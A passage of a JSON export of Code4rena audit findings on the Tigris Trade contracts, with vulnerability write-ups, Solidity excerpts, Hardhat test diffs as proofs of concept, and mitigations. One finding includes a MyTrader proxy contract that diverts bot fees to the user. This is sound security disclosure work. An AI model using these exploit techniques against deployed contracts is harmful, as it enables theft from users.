network.provider.send(\"evm_increaseTime\", [86400 * 3]); // Skip 3 days\n      await network.provider.send(\"evm_mine\");\n\n      // Bond 2 expired, so it doesn't receive any of the new tokens that were distributed\n      [,,,,,,,pending,,,] = await bond.idToBond(2);\n      expect(pending).to.be.equals(\"499999999999999999986\");\n\n      // Thus, Bond 1 should get all the tokens, increasing its pending value to 1499999999999999999960\n      // But, because bond 2 wasn't released (`totalShares` wasn't updated), bond 1 receives less tokens than it should.\n      // Thus, the following check below fails\n      [,,,,,,,pending,,,] = await bond.idToBond(1);\n      expect(pending).to.be.equals(\"1499999999999999999960\");\n\n      await lock.connect(user).release(2);\n\n      expect(await stabletoken.balanceOf(user.address)).to.be.equals(\"1499999999999999999986\");\n\n    });\n```\n\nThe `totalShares` value is only updated after a lock is released:\n\n```sol\n    function release(\n        uint _id,\n        address _releaser\n    ) external onlyManager() returns(uint amount, uint lockAmount, address asset, address _owner) {\n        Bond memory bond = idToBond(_id);\n        require(bond.expired, \"!expire\");\n        if (_releaser != bond.owner) {\n            unchecked {\n                require(bond.expireEpoch + 7 < epoch[bond.asset], \"Bond owner priority\");\n            }\n        }\n        amount = bond.amount;\n        unchecked {\n            totalShares[bond.asset] -= bond.shares;\n        // ... \n```\n\n### Recommended Mitigation Steps\n\nOnly shares belonging to an active bond should be used for the distribution logic.\n\n**[TriHaz (Tigris Trade) disputed and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/630#issuecomment-1374438815):**\n > >Since this causes a loss of funds for every bond holder I rate it as HIGH. \n> \n> Funds are not lost, they will be redistributed when the bond is expired. \n> https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L180\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/630#issuecomment-1399439420):**\n> I've asked the Warden for additional proof.  \n> \n>*(Note: See [original submission](https://github.com/code-423n4/2022-12-tigris-findings/issues/630#issuecomment-1399439420) for proof.)*\n>\n> And believe that the finding is valid.\n> \n> I have adapted the test to also claim after, and believe that the lost rewards cannot be received back (see POC and different values we get back).\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/630#issuecomment-1399439953):**\n > I have to agree with the Warden's warning, however, the `release` function is public, meaning anybody can break expired locks.\n> \n> For this reason, I believe that Medium Severity is more appropriate.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability that exists in the BondNFT contract code. It is found in lines 150 and 225 of the code. The issue is that after a lock has expired, it does not receive any rewards and other existing bonds also do not receive the full amount of tokens due to the unreleased locks. This causes bond owners to receive less rewards than they should. This vulnerability is rated as HIGH since it can cause a loss of funds for every bond holder. \n\nThe vulnerability can be tested using the 09.Bonds.js code. The `totalShares` value is only updated after a lock is released. To mitigate this vulnerability, only shares belonging to an active bond should be used for the distribution logic.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/630",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "__141345__",
        "Ermaniwe",
        "Ruhum",
        "wait",
        "rvierdiiev"
      ]
    },
    {
      "id": "6351",
      "title": "[M-21] executeLimitOrder() modifies open-interest with a wrong position value",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L513-L517\n\n\n## Vulnerability details\n\n\nThe `PairsContract` registeres the total long/short position that's open for a pair of assets, whenever a new position is created the total grows accordingly.\nHowever at `executeLimitOrder()` the position size that's added is wrongly calculated - it uses margin before fees, while the actual position is created after subtracting fees.\n\n## Impact\nThe OpenInterest would register wrong values (11% diff in the case of PoC), which will distort the balance between long and short positions (the whole point of the OpenInterest is to balance them to be about equal).\n\n\n## Proof of Concept\nIn the following test, an order is created with a x100 leverage, and the position size registered for OI is 11% greater than the actual position created.\n\n\n```diff\ndiff --git a/test/07.Trading.js b/test/07.Trading.js\nindex ebe9948..dfb7f98 100644\n--- a/test/07.Trading.js\n+++ b/test/07.Trading.js\n@@ -778,7 +778,7 @@ describe(\"Trading\", function () {\n      */\n     it(\"Creating and executing limit buy order, should have correct price and bot fees\", async function () {\n       // Create limit order\n-      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n+      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"100\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n       let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n       await trading.connect(owner).initiateLimitOrder(TradeInfo, 1, parseEther(\"20000\"), PermitData, owner.address);\n       expect(await position.limitOrdersLength(0)).to.equal(1); // Limit order opened\n@@ -787,6 +787,9 @@ describe(\"Trading\", function () {\n       await network.provider.send(\"evm_increaseTime\", [10]);\n       await network.provider.send(\"evm_mine\");\n \n+      let count = await position.getCount();\n+      let id = count.toNumber() - 1;\n+\n       // Execute limit order\n       let PriceData = [node.address, 0, parseEther(\"10000\"), 10000000, 2000000000, false]; // 0.1% spread\n       let message = ethers.utils.keccak256(\n@@ -798,8 +801,22 @@ describe(\"Trading\", function () {\n       let sig = await node.signMessage(\n         Buffer.from(message.substring(2), 'hex')\n       );\n+      // trading.connect(owner).setFees(true,3e8,1e8,1e8,1e8,1e8);\n       \n-      await trading.connect(user).executeLimitOrder(1, PriceData, sig);\n+\n+      let oi = await pairscontract.idToOi(0, stabletoken.address);\n+      expect(oi.longOi.toNumber()).to.equal(0);\n+      console.log({oi, stable:stabletoken.address});\n+\n+      await trading.connect(user).executeLimitOrder(id, PriceData, sig);\n+      let trade = await position.trades(id);\n+      console.log(trade);\n+      oi = await pairscontract.idToOi(0, stabletoken.address);\n+      console.log(oi);\n+\n+      expect(oi.longOi.div(10n**18n).toNumber()).to.equal(trade.margin.mul(trade.leverage).div(10n**18n * 10n**18n).toNumber());\n+\n+\n       expect(await position.limitOrdersLength(0)).to.equal(0); // Limit order executed\n       expect(await position.assetOpenPositionsLength(0)).to.equal(1); // Creates open position\n       expect((await trading.openFees()).botFees).to.equal(2000000);\n@@ -807,6 +824,7 @@ describe(\"Trading\", function () {\n       let [,,,,price,,,,,,,] = await position.trades(1);\n       expect(price).to.equal(parseEther(\"20020\")); // Should have guaranteed execution price with spread\n     });\n+    return;\n     it(\"Creating and executing limit sell order, should have correct price and bot fees\", async function () {\n       // Create limit order\n       let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, false, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n@@ -1606,6 +1624,7 @@ describe(\"Trading\", function () {\n       expect(await stabletoken.balanceOf(user.address)).to.equal(parseEther(\"1.5\"));\n     });\n   });\n+  return;\n   describe(\"Modifying functions\", function () {\n     it(\"Updating TP/SL on a limit order should revert\", async function () {\n       let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n\n```\n\nOutput:\n```\n1) Trading\n       Limit orders and liquidations\n         Creating and executing limit buy order, should have correct price and bot fees:\n\n      AssertionError: expected 100000 to equal 90000\n      + expected - actual\n\n      -100000\n      +90000\n```\n\n\n## Recommended Mitigation Steps\nCorrect the calculation to use margin after fees.",
      "summary": "\nA bug was found in the `PairsContract` code in the `executeLimitOrder()` function. This function is responsible for registering the total long/short position that's open for a pair of assets. The bug causes the position size that's added to be wrongly calculated, as it uses margin before fees, while the actual position is created after subtracting fees. \n\nThe impact of this bug is that the OpenInterest would register wrong values, resulting in a distorted balance between long and short positions. A proof of concept was provided in the report, which showed that an order created with a x100 leverage, and the position size registered for OI is 11% greater than the actual position created. \n\nThe recommended mitigation step for this bug is to correct the calculation to use margin after fees.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/576",
      "tags": [],
      "finders": [
        "KingNFT",
        "0xA5DF",
        "HollaDieWaldfee",
        "Jeiwan"
      ]
    },
    {
      "id": "6350",
      "title": "[M-20] Trading#initiateMarketOrder allows to open a position with more margin than expected due to _handleOpenFees wrong calculation when a trade is referred",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178-L179> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734-L738>\n\nWhen `initiateMarketOrder` is called, `_marginAfterFees` are calculated and then used to calculate `_positionSize`:\n\n```solidity\nuint256 _marginAfterFees = _tradeInfo.margin - _handleOpenFees(_tradeInfo.asset, _tradeInfo.margin*_tradeInfo.leverage/1e18, _trader, _tigAsset, false);\nuint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18;\n```\n\nThe problem is that `_handleOpenFees` does not consider referrer fees when it calculates its output (paidFees), leading to open a position greater than expected.\n\n### Impact\n\nFor a referred trade, `initiateMarketOrder` always opens a position greater than the one supposed, by allowing the use of more margin than the one expected.\n\n### Proof of Concept\n\nThe output of `_handleOpenFees` is `_feePaid`, which is calculated [once](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734-L738), and it does not consider referralFees:\n\n```solidity\n// No refferal fees are considered\n_feePaid =\n    _positionSize\n    * (_fees.burnFees + _fees.botFees) // get total fee%\n    / DIVISION_CONSTANT // divide by 100%\n    + _daoFeesPaid;\n```\n\nThen we can notice that, if the output of `_handleOpenFees` did not consider referral fees, neither would `\\_marginAfterFees` do:\n\n```solidity\nuint256 _marginAfterFees =\n    _tradeInfo.margin-\n    _handleOpenFees(\n        _tradeInfo.asset,\n        _tradeInfo.margin*_tradeInfo.leverage/1e18, \n        _trader,\n        _tigAsset,\n        false);\n\n// @audit Then _positionSize would be greater than what is supposed to be, allowing to create a position greater than expected\nuint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18;\n```\n\n### Recommended Mitigation steps\n\nConsider referral fees when `_feePaid` is calculated in `_handleOpenFees`:\n\n```diff\n// In _handleOpenFees function\n+   uint256 _refFeesToConsider = _referrer == address(0) ? 0 : _fees.referralFees;\n    _feePaid =\n        _positionSize\n-       * (_fees.burnFees + _fees.botFees) // get total fee%\n+       * (_fees.burnFees + _fees.botFees + _refFeesToConsider) // get total fee%\n        / DIVISION_CONSTANT // divide by 100%\n        + _daoFeesPaid;\n```\n\n**[TriHaz (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/542)** \n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/542#issuecomment-1382265541):**\n > The warden has shown an accounting issue in how fees are calculated, the refactoring is straightforward.\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the code of a Trading contract on the Tigris platform. The vulnerability is related to the ```initiateMarketOrder``` function, which calculates the ```_marginAfterFees``` and then uses it to calculate ```_positionSize``` using the following code:\n\n```solidity\nuint256 _marginAfterFees = _tradeInfo.margin - _handleOpenFees(_tradeInfo.asset, _tradeInfo.margin*_tradeInfo.leverage/1e18, _trader, _tigAsset, false);\nuint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18;\n```\n\nThe problem is that ```_handleOpenFees``` does not consider referrer fees when it calculates its output (paidFees), leading to open a position greater than expected. This means that for a referred trade, ```initiateMarketOrder``` always opens a position greater than the one supposed, by allowing to use more margin than the one expected.\n\nThe output of ```_handleOpenFees``` is ```_feePaid```, which is calculated once and it does not consider referralFees. This leads to ```_positionSize``` being greater than what is supposed to be, allowing to create a position greater than expected.\n\nTo mitigate this vulnerability, the code should consider referral fees when ```_feePaid``` is calculated in ```_handleOpenFees``` as follows:\n\n```solidity\n// In _handleOpenFees function\n+   uint256 _refFeesToConsider = _referrer == address(0) ? 0 : _fees.referralFees;\n    _feePaid =\n        _positionSize\n-       * (_fees.burnFees + _fees.botFees) // get total fee%\n+       * (_fees.burnFees + _fees.botFees + _refFeesToConsider) // get total fee%\n        / DIVISION_CONSTANT // divide by 100%\n        + _daoFeesPaid;\n```\n\nThis bug report highlights a vulnerability in the code of the Trading contract on the",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/542",
      "tags": [],
      "finders": [
        "koxuan",
        "carlitox477"
      ]
    },
    {
      "id": "6349",
      "title": "[M-19] _handleDeposit and _handleWithdraw do not account for tokens with decimals higher than 18",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L650\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L675\n\n\n## Vulnerability details\n\n## Impact \n\nIn `Trading.sol` a [deposit](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L675) or [withdrawal](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L700) of tokens with decimals higher than 18 will always revert. \n\nThis is the case e.g. for `NEAR` which is divisible into 10e24 `yocto` \n\n## Proof of Concept\n\nChange [00.Mocks.js#L33](https://github.com/code-423n4/2022-12-tigris/blob/main/deploy/test/00.Mocks.js#L33) to:\n\n```\nargs: [\"USDC\", \"USDC\", 24, deployer, ethers.utils.parseUnits(\"1000\", 24)]\n```\n\nThen in [07.Trading.js](https://github.com/code-423n4/2022-12-tigris/blob/main/test/07.Trading.js):\n\n```\nOpening and closing a position with tigUSD output\nOpening and closing a position with <18 decimal token output\n```\n\nare going to fail with:\n```\nError: VM Exception while processing transaction: reverted with panic code 0x11 (Arithmetic operation underflowed or overflowed outside of an unchecked block)\n```\n\n## Tools Used\n\nVisual Studio Code\n\n## Recommended Mitigation Steps\n\nUpdate calculations in the contract to account for tokens with decimals higher than 18.",
      "summary": "\nThis bug report is about a vulnerability in the Trading.sol contract. This vulnerability can cause a deposit or withdrawal of tokens with decimals higher than 18 to always revert. This can be demonstrated by changing the 00.Mocks.js file and running the 07.Trading.js test. This will result in an error that says \"Arithmetic operation underflowed or overflowed outside of an unchecked block\". To fix this vulnerability, calculations in the contract should be updated to account for tokens with decimals higher than 18.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/533",
      "tags": [
        "Decimals"
      ],
      "finders": [
        "Avci",
        "Deivitto",
        "pwnforce",
        "rbserver",
        "0xDecorativePineapple",
        "Dinesh11G",
        "izhelyazkov",
        "Englave",
        "Tointer",
        "Critical",
        "0xdeadbeef0x",
        "ak1",
        "chaduke",
        "unforgiven",
        "rvierdiiev",
        "yjrwkk",
        "0x4non"
      ]
    },
    {
      "id": "6348",
      "title": "[M-18] StopLoss/TakeProfit should be validated again for the new price in Trading.executeLimitOrder()",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/b2ebb8ea1def4927a747e7a185174892506540ab/contracts/Trading.sol#L506\n\n\n## Vulnerability details\n\n## Impact\nThe open price of a stop order might be changed during execution but it doesn't validate StopLoss/TakeProfit for the changed price.\n\nAs a result, the executed market order might be closed immediately and there would be an unexpected loss for users.\n\n## Proof of Concept\nAs we can see from `executeLimitOrder()`, the open price might be changed to the current price for the stop order.\n\n```solidity\nFile: 2022-12-tigris\\contracts\\Trading.sol\n480:     function executeLimitOrder(\n481:         uint _id, \n482:         PriceData calldata _priceData,\n483:         bytes calldata _signature\n484:     ) \n485:         external\n486:     {\n487:         unchecked {\n488:             _checkDelay(_id, true);\n489:             tradingExtension._checkGas();\n490:             if (tradingExtension.paused()) revert TradingPaused();\n491:             require(block.timestamp >= limitDelay[_id]);\n492:             IPosition.Trade memory trade = position.trades(_id);\n493:             uint _fee = _handleOpenFees(trade.asset, trade.margin*trade.leverage/1e18, trade.trader, trade.tigAsset, true);\n494:             (uint256 _price, uint256 _spread) = tradingExtension.getVerifiedPrice(trade.asset, _priceData, _signature, 0);\n495:             if (trade.orderType == 0) revert(\"5\");\n496:             if (_price > trade.price+trade.price*limitOrderPriceRange/DIVISION_CONSTANT || _price < trade.price-trade.price*limitOrderPriceRange/DIVISION_CONSTANT) revert(\"6\"); //LimitNotMet\n497:             if (trade.direction && trade.orderType == 1) {\n498:                 if (trade.price < _price) revert(\"6\"); //LimitNotMet\n499:             } else if (!trade.direction && trade.orderType == 1) {\n500:                 if (trade.price > _price) revert(\"6\"); //LimitNotMet\n501:             } else if (!trade.direction && trade.orderType == 2) {\n502:                 if (trade.price < _price) revert(\"6\"); //LimitNotMet\n503:                 trade.price = _price;\n504:             } else {\n505:                 if (trade.price > _price) revert(\"6\"); //LimitNotMet\n506:                 trade.price = _price; //@audit check sl/tp\n507:             } \n508:             if(trade.direction) {\n509:                 trade.price += trade.price * _spread / DIVISION_CONSTANT;\n510:             } else {\n511:                 trade.price -= trade.price * _spread / DIVISION_CONSTANT;\n512:             }\n\n```\n\nBut it doesn't validate sl/tp again for the new price so the order might have an invalid sl/tp.\n\nThe new price wouldn't satisfy the sl/tp requirements when the price was changed much from the original price due to the high slippage and the order might be closed immediately by sl or tp in this case.\n\nOriginally, the protocol validates stoploss only but I say to validate both of stoploss and takeprofit. (I submitted it as another issue to validate tp as well as sl).\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nRecommend validating sl/tp for the new `trade.price` in `Trading.executeLimitOrder()`.",
      "summary": "\nThis bug report is about a vulnerability in the code of the \"2022-12-tigris\" project on Github. The vulnerability is related to the open price of a stop order, which might be changed during execution without validating StopLoss/TakeProfit for the changed price. If the price is changed too much from the original price, the order might be closed immediately and result in unexpected losses for users.\n\nThe vulnerability was discovered through manual review of the code. It is recommended that the code be updated to validate sl/tp for the new \"trade.price\" in the \"Trading.executeLimitOrder()\" function. This will help ensure that the order is not closed unexpectedly due to high slippage.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/512",
      "tags": [],
      "finders": [
        "bin2chen",
        "hansfriese"
      ]
    },
    {
      "id": "6347",
      "title": "[M-17] User can close an order via limitClose(), and take bot fees to themselves",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L565-L576\n\n\n## Vulnerability details\n\n\n\n## Impact\nBot fees are used when a position is opened/closed via a bot. In that case a bot fee is subtracted from the dao fee and sent to the closing bot.\nA user can use that to to reduce the dao fees for closing an order and keep it to themselves.\nInstead of closing the order via `initiateClose()`, the user can use a proxy contract to update the stop-loss value and then `limitClose()` the order.\nSince that is done in one function call, no bot can run the `limitClose()` and the bot fee will go to the user.\n\n## Proof of Concept\n\nThe following PoC shows how a trade is closed by a proxy contract that sets the limit and closes it via `limitClose()`:\n\n```diff\ndiff --git a/test/07.Trading.js b/test/07.Trading.js\nindex ebe9948..e50b0cc 100644\n--- a/test/07.Trading.js\n+++ b/test/07.Trading.js\n@@ -17,6 +17,7 @@ describe(\"Trading\", function () {\n \n   let TradingExtension;\n   let tradingExtension;\n+  let myTrader;\n \n   let TradingLibrary;\n   let tradinglibrary;\n@@ -37,7 +38,7 @@ describe(\"Trading\", function () {\n \n   let MockDAI;\n   let MockUSDC;\n-  let mockusdc;\n+  let mockusdc, mockdai;\n \n   let badstablevault;\n \n@@ -55,6 +56,7 @@ describe(\"Trading\", function () {\n     const Position = await deployments.get(\"Position\");\n     position = await ethers.getContractAt(\"Position\", Position.address);\n     MockDAI = await deployments.get(\"MockDAI\");\n+    mockdai = await ethers.getContractAt(\"MockERC20\", MockDAI.address);\n     MockUSDC = await deployments.get(\"MockUSDC\");\n     mockusdc = await ethers.getContractAt(\"MockERC20\", MockUSDC.address);\n     const PairsContract = await deployments.get(\"PairsContract\");\n@@ -84,6 +86,10 @@ describe(\"Trading\", function () {\n     TradingLibrary = await deployments.get(\"TradingLibrary\");\n     tradinglibrary = await ethers.getContractAt(\"TradingLibrary\", TradingLibrary.address);\n     await trading.connect(owner).setLimitOrderPriceRange(1e10);\n+\n+\n+    let mtFactory = await ethers.getContractFactory(\"MyTrader\");\n+    myTrader = await mtFactory.deploy(Trading.address, Position.address);\n   });\n   describe(\"Check onlyOwner and onlyProtocol\", function () {\n     it(\"Set max win percent\", async function () {\n@@ -536,6 +542,31 @@ describe(\"Trading\", function () {\n       expect(await position.assetOpenPositionsLength(0)).to.equal(1); // Trade has opened\n       expect(await stabletoken.balanceOf(owner.address)).to.equal(parseEther(\"0\")); // Should no tigAsset left\n     });\n+\n+    it(\"Test my trader\", async function () {\n+      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n+      let PriceData = [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false];\n+      let message = ethers.utils.keccak256(\n+        ethers.utils.defaultAbiCoder.encode(\n+          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n+          [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false]\n+        )\n+      );\n+      let sig = await node.signMessage(\n+        Buffer.from(message.substring(2), 'hex')\n+      );\n+      \n+      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n+      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\n+\n+\n+      await trading.connect(owner).approveProxy(myTrader.address, 1e10);\n+      await myTrader.connect(owner).closeTrade(1, PriceData, sig);\n+\n+\n+    });\n+  return;\n+\n     it(\"Closing over 100% should revert\", async function () {\n       let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n       let PriceData = [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false];\n@@ -551,8 +582,10 @@ describe(\"Trading\", function () {\n       \n       let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n       await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\n+\n       await expect(trading.connect(owner).initiateCloseOrder(1, 1e10+1, PriceData, sig, StableVault.address, StableToken.address, owner.address)).to.be.revertedWith(\"BadClosePercent\");\n     });\n+    return;\n     it(\"Closing 0% should revert\", async function () {\n       let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n       let PriceData = [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false];\n@@ -700,6 +733,7 @@ describe(\"Trading\", function () {\n       expect(margin).to.equal(parseEther(\"500\"));\n     });\n   });\n+  return;\n   describe(\"Trading using <18 decimal token\", async function () {\n     it(\"Opening and closing a position with tigUSD output\", async function () {\n       await pairscontract.connect(owner).setAssetBaseFundingRate(0, 0); // Funding rate messes with results because of time\n\n```\n\n`MyTrader.sol`:\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {ITrading} from \"../interfaces/ITrading.sol\";\nimport \"../utils/TradingLibrary.sol\";\nimport \"../interfaces/IPosition.sol\";\nimport {ERC20} from \"@openzeppelin/contracts/token/ERC20/extensions/draft-ERC20Permit.sol\";\n\n\n\n\ncontract MyTrader{\n\n    ITrading trading;\n    IPosition position;\n\n    receive() payable external{\n\n    }\n\n    constructor(address _trading, address _position){\n        trading = ITrading(_trading);\n        position = IPosition(_position);\n    }\n\n    function closeTrade(\n        uint _id,\n        PriceData calldata _priceData,\n        bytes calldata _signature\n    ) public{\n        bool _tp = false;\n        \n        trading.updateTpSl(_tp, _id, _priceData.price, _priceData, _signature, msg.sender);\n        trading.limitClose(_id, _tp, _priceData, _signature);\n\n        \n    }\n\n}\n```\n\n## Recommended Mitigation Steps\nDon't allow updating sl or tp and",
      "summary": "\nA bug was recently reported in the Trading.sol contract, which is part of the code-423n4/2022-12-tigris repository on GitHub. This bug allows users to reduce the dao fees for closing an order and keep it to themselves. The bug is triggered when a user uses a proxy contract to update the stop-loss value and then limitClose() the order. This is done in one function call, which prevents bots from running the limitClose() and the bot fee being sent to the user. \n\nA proof of concept was provided, which showed how a trade is closed by a proxy contract that sets the limit and closes it via limitClose(). An additional contract, MyTrader.sol, was also provided. \n\nThe recommended mitigation steps are to not allow updating the stop-loss or take-profit values, as this is how the bug is triggered.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/468",
      "tags": [],
      "finders": [
        "0xA5DF"
      ]
    },
    {
      "id": "6346",
      "title": "[M-16] distribute() won’t update epoch[tigAsset] when totalShares[tigAsset]==0 which can cause later created bond for this tigAsset to have wrong mint epoch",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L206-L228\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L48-L86\n\n\n## Vulnerability details\n\n## Impact\nFunction `BondNFT.createLock()` creates a bond and it sets bond's mint epoch as `epoch[asset]`, function `Lock.lock()` first calls `claimGovFees()` which calls `BondNFT.distribute()` for all assets and updates the `epoch[assets]` for all assets. so during normal bond creation the value of `epoch[asset]` would be updated and bond would be created from `today` epoch to `today+period` epoch. but if `totalShares[tigAsset] == 0` for an asset, then `distribute()` won't update `epoch[asset]` for that asset and `epoch[asset]` will be some old epoch(will be the start time where asset is added or the time where `totalShares[_tigAsset] != 0`). This would make `createLock()` to set very wrong value for bond's mint epoch when `totalShares[tigAsset] == 0`.\nThis would happen for the first bond that has been created for that asset always and it will happen again if for some period `totalShares[asset]` become 0, then the next bond would have wrong mint epoch. or `setAllowedAsset(asset, false)`  has been called for that asset.\n\n## Proof of Concept\nThis is `distribute()` code in BondNFT contract:\n```\nfunction distribute(\n        address _tigAsset,\n        uint _amount\n    ) external {\n        if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;\n        IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);\n        unchecked {\n            uint aEpoch = block.timestamp / DAY;\n            if (aEpoch > epoch[_tigAsset]) {\n                for (uint i=epoch[_tigAsset]; i<aEpoch; i++) {\n                    epoch[_tigAsset] += 1;\n                    accRewardsPerShare[_tigAsset][i+1] = accRewardsPerShare[_tigAsset][i];\n                }\n            }\n            accRewardsPerShare[_tigAsset][aEpoch] += _amount * 1e18 / totalShares[_tigAsset];\n        }\n        emit Distribution(_tigAsset, _amount);\n    }\n```\nAs you can see when `totalShares[_tigAsset] == 0` then the value of `epoch[_tigAsset]` won't get updated to the today. and there is no other logics in the code to update `epoch[tigAsset]`. so when `totalShares[_tigAsset] == 0` then the value of the `epoch[tigAsset]` would be out dated. this would happen when asset is recently added to the BondNFT assets or when in some time there is no bond left.\nWhen this condition happens and a user call `Lock.lock()` to create a bond the `lock()` function would call `claimGovFees()` to update rewards in BondNFT but because for that asset the value of totalShares are 0 so for that asset `epoch[]` won't get updated and in the `BondNFT.createLock()` the wrong value would set as bond't mint epoch.\nThis is `Lock.lock()` code:\n```\n    function lock(\n        address _asset,\n        uint _amount,\n        uint _period\n    ) public {\n        require(_period <= maxPeriod, \"MAX PERIOD\");\n        require(_period >= minPeriod, \"MIN PERIOD\");\n        require(allowedAssets[_asset], \"!asset\");\n\n        claimGovFees();\n\n        IERC20(_asset).transferFrom(msg.sender, address(this), _amount);\n        totalLocked[_asset] += _amount;\n        \n        bondNFT.createLock( _asset, _amount, _period, msg.sender);\n    }\n```\nAnd this is `BondNFT.createLock()` code:\n```\n    function createLock(\n        address _asset,\n        uint _amount,\n        uint _period,\n        address _owner\n    ) external onlyManager() returns(uint id) {\n        require(allowedAsset[_asset], \"!Asset\");\n        unchecked {\n            uint shares = _amount * _period / 365;\n            uint expireEpoch = epoch[_asset] + _period;\n            id = ++totalBonds;\n            totalShares[_asset] += shares;\n            Bond memory _bond = Bond(\n                id,             // id\n                address(0),     // owner\n                _asset,         // tigAsset token\n                _amount,        // tigAsset amount\n                epoch[_asset],  // mint epoch\n                block.timestamp,// mint timestamp\n                expireEpoch,    // expire epoch\n                0,              // pending\n                shares,         // linearly scaling share of rewards\n                _period,        // lock period\n                false           // is expired boolean\n            );\n            _idToBond[id] = _bond;\n            _mint(_owner, _bond);\n        }\n        emit Lock(_asset, _amount, _period, 